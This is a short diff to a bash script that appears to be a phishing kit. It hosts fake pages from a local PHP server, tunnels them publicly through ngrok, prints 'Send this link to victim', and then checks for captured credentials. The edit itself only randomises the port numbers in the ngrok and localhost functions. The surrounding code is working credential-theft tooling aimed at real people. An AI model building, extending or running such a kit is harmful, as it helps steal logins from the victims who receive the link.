@@ -57,8 +57,9 @@ s_ngrok(){
 			echo -e "${r} Error Please try again"
 		fi
 	fi
-	php -S 127.0.0.1:8870 -t .pweb/$1 > /dev/null 2>&1 & sleep 2
-	./ngrok http 127.0.0.1:8870 > /dev/null 2>&1 & sleep 8
+	ran=$((RANDOM % 10))
+	php -S 127.0.0.1:800$ran -t .pweb/$1 > /dev/null 2>&1 & sleep 2
+	./ngrok http 127.0.0.1:800$ran > /dev/null 2>&1 & sleep 8
 	n_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 	echo -e "${y}[${w}+${y}]${r} Send this link to victim"
 	echo -e " "
@@ -77,16 +78,17 @@ s_localhost(){
 	echo -e "\n"
 	echo -e "${g}[${r}~${g}] ${w} Port selection "
 	echo -e "\n"
-	echo -e "${p}[${w}01${p}] ${r} Default(8877) "
+	ran=$((RANDOM % 10))
+	echo -e "${p}[${w}01${p}] ${r} Random"
 	echo -e "${p}[${w}02${p}] ${r} Custom  "
 	echo -e "\n"
 	echo -ne "${g}[${r}~${g}] ${w} Choose option: "
 	read lp_optn
 	if [[ $lp_optn -eq 1 ]] || [[ $lp_optn -eq 01 ]];then
 		echo -e "\n"
-		php -S 127.0.0.1:8877 -t .pweb/$1 > /dev/null 2>&1 & sleep 5 
+		php -S 127.0.0.1:887$ran -t .pweb/$1 > /dev/null 2>&1 & sleep 5 
 		echo -e "\n"
-		echo -e "${r}[${g}+${r}] ${y} Localhost running on http://127.0.0.1:8877 "
+		echo -e "${r}[${g}+${r}] ${y} Localhost running on http://127.0.0.1:887$ran"
 		#now check for user crenditial------
 		check_cred $1
 	elif [[ $lp_optn -eq 2 ]] || [[ $lp_optn -eq 02 ]];then
